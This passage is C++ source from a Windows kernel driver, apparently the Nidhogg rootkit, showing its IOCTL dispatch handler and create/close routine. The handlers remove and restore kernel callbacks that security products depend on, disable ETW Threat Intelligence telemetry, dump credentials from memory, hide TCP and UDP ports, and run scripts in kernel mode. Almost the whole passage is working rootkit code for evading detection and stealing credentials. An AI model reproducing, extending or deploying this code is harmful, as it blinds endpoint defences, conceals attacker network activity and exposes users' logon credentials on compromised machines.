		case PsCreateThreadTypeNonSystemThread: {
			status = NidhoggAntiAnalysisHandler->ListPsNotifyRoutines(data);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
		}

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to list ps routines (0x%08X).\n", status);
			break;
		}

		len += size;
		break;
	}
	case IOCTL_LIST_REGCALLBACKS:
	{
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlCallbackList<CmCallback>)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlCallbackList<CmCallback>*>(Irp->AssociatedIrp.SystemBuffer);

		if (!data->Callbacks) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggAntiAnalysisHandler->ListRegistryCallbacks(data);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to list registry callbacks (0x%08X).\n", status);
			break;
		}

		len += size;
		break;
	}

	case IOCTL_REMOVE_RESTORE_CALLBACK:
	{
		IoctlKernelCallback callbackInfo{};
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlKernelCallback)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlKernelCallback*>(Irp->AssociatedIrp.SystemBuffer);

		if (!VALID_KERNELMODE_MEMORY(data->CallbackAddress)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		callbackInfo.CallbackAddress = data->CallbackAddress;
		callbackInfo.Type = data->Type;
		callbackInfo.Remove = data->Remove;

		if (data->Remove) {
			switch (data->Type) {
			case PsImageLoadType:
			case PsCreateProcessType:
			case PsCreateProcessTypeEx:
			case PsCreateThreadType:
			case PsCreateThreadTypeNonSystemThread:
			case ObProcessType:
			case ObThreadType:
			case CmRegistryType: {
				status = NidhoggAntiAnalysisHandler->ReplaceCallback(callbackInfo);
				break;
			}
			default:
				status = STATUS_INVALID_PARAMETER;
			}
			NT_SUCCESS(status) ? Print(DRIVER_PREFIX "Removed callback %p.\n", data->CallbackAddress) :
				Print(DRIVER_PREFIX "Failed to remove callback (0x%08X).\n", status);
		}
		else {
			switch (data->Type) {
			case PsImageLoadType:
			case PsCreateProcessType:
			case PsCreateProcessTypeEx:
			case PsCreateThreadType:
			case PsCreateThreadTypeNonSystemThread:
			case ObProcessType:
			case ObThreadType:
			case CmRegistryType: {
				status = NidhoggAntiAnalysisHandler->RestoreCallback(callbackInfo);
				break;
			}
			default:
				status = STATUS_INVALID_PARAMETER;
			}

			NT_SUCCESS(status) ? Print(DRIVER_PREFIX "Restored callback %p.\n", data->CallbackAddress) :
				Print(DRIVER_PREFIX "Failed to restore callback (0x%08X).\n", status);
		}

		if (!NT_SUCCESS(status))
			break;
		len += size;
		break;
	}

	case IOCTL_ENABLE_DISABLE_ETWTI:
	{
		if (!Features.EtwTiTamper) {
			Print(DRIVER_PREFIX "Due to previous error, ETW-TI tampering is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(bool)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<bool*>(Irp->AssociatedIrp.SystemBuffer);
		status = NidhoggAntiAnalysisHandler->EnableDisableEtwTI(*data);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to disable ETW-TI (0x%08X)\n", status);
			break;
		}

		len += size;
		break;
	}

	case IOCTL_DUMP_CREDENTIALS:
	{
		ULONG size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (size == sizeof(IoctlCredentialsInfoSize)) {
			auto data = static_cast<IoctlCredentialsInfoSize*>(Irp->AssociatedIrp.SystemBuffer);
			status = NidhoggMemoryHandler->DumpCredentials(data);
		}
		else if (size == sizeof(IoctlCredentialsSize)) {
			auto data = static_cast<PVOID*>(Irp->AssociatedIrp.SystemBuffer);

			if (!data) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			PVOID credentialsSizeAddress = *data;
			IoctlCredentialsSize* credentialsSize = static_cast<IoctlCredentialsSize*>(credentialsSizeAddress);
			status = NidhoggMemoryHandler->GetCredentialsSize(credentialsSize);

			if (NT_SUCCESS(status))
				Print(DRIVER_PREFIX "Dumped credentials size successfully.\n");
		}
		else if (size == sizeof(IoctlCredentialsInformation)) {
			auto data = static_cast<IoctlCredentialsInformation*>(Irp->AssociatedIrp.SystemBuffer);
			status = NidhoggMemoryHandler->GetCredentials(data);

			if (NT_SUCCESS(status))
				Print(DRIVER_PREFIX "Dumped credentials successfully.\n");
		}
		else {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to dump credentials (0x%08X)\n", status);
			break;
		}

		len += size;
		break;
	}

	case IOCTL_HIDE_UNHIDE_PORT:
	{
		HiddenPort hiddenPort{};
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlHiddenPort)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlHiddenPort*>(Irp->AssociatedIrp.SystemBuffer);

		hiddenPort.Type = data->Type;
		hiddenPort.Remote = data->Remote;
		hiddenPort.Port = data->Port;

		if (hiddenPort.Port == 0 || (hiddenPort.Type != PortType::TCP && hiddenPort.Type != PortType::UDP)) {
			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Hide) {
			if (!NidhoggNetworkHandler->AddHiddenPort(hiddenPort)) {
				Print(DRIVER_PREFIX "Failed to hide port.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			Print(DRIVER_PREFIX "Hid port %d.\n", hiddenPort.Port);
		}
		else {
			if (!NidhoggNetworkHandler->RemoveHiddenPort(hiddenPort)) {
				Print(DRIVER_PREFIX "Failed to reveal port.\n");
				status = STATUS_NOT_FOUND;
				break;
			}
			Print(DRIVER_PREFIX "Revealed port %d.\n", hiddenPort.Port);
		}

		len += size;
		break;
	}
	case IOCTL_LIST_HIDDEN_PORTS:
	{
		ULONG size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (size != sizeof(IoctlHiddenPorts)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlHiddenPorts*>(Irp->AssociatedIrp.SystemBuffer);

		if (!NidhoggNetworkHandler->ListHiddenPorts(data)) {
			Print(DRIVER_PREFIX "Failed to list hidden ports.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		len += size;
		break;
	}
	case IOCTL_CLEAR_HIDDEN_PORTS:
	{
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(PortType)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<PortType*>(Irp->AssociatedIrp.SystemBuffer);
		NidhoggNetworkHandler->ClearHiddenPortsList(*data);
		break;
	}
	case IOCTL_EXEC_SCRIPT:
	{
		ScriptManager* scriptManager = nullptr;
		ScriptInformation scriptInfo{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(ScriptInformation)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<ScriptInformation*>(Irp->AssociatedIrp.SystemBuffer);

		if (data->ScriptSize == 0 || !data->Script) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		scriptInfo.ScriptSize = data->ScriptSize;
		MemoryAllocator<PVOID> script(scriptInfo.ScriptSize);
		status = script.CopyData(data->Script, scriptInfo.ScriptSize);

		if (!NT_SUCCESS(status))
			break;
		scriptInfo.Script = script.Get();

		__try {
			scriptManager = new ScriptManager();
			status = scriptManager->ExecuteScript((PUCHAR)scriptInfo.Script, scriptInfo.ScriptSize);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			status = GetExceptionCode();
		}

		if (scriptManager) {
			delete scriptManager;
			scriptManager = nullptr;
		}

		NT_SUCCESS(status) ? Print(DRIVER_PREFIX "Executed script successfully.\n") :
			Print(DRIVER_PREFIX "Failed to execute script (0x%08X)\n", status);

		len += size;
		break;
	}
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	// IrqlGuard will restore the original IRQL on exit, but ensuring that the IRQL is PASSIVE_LEVEL before calling to IoCompleteRequest.
	if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
		guard.SetExitIrql(guard.GetOriginalIrql());
		guard.SetIrql(PASSIVE_LEVEL, true);
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = len;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}


/*
* Description:
* NidhoggCreateClose is responsible for creating a success response for given IRP.
*
* Parameters:
* @DeviceObject [_Inout_ PDEVICE_OBJECT] -- Not used.
* @Irp			[_Inout_ PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
*
* Returns:
* @status		[NTSTATUS]			  -- Whether the function succeeded or not, if not the error code.
*/
_Function_class_(DRIVER_DISPATCH)
_IRQL_requires_max_(DISPATCH_LEVEL)
_IRQL_requires_same_
NTSTATUS NidhoggCreateClose(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}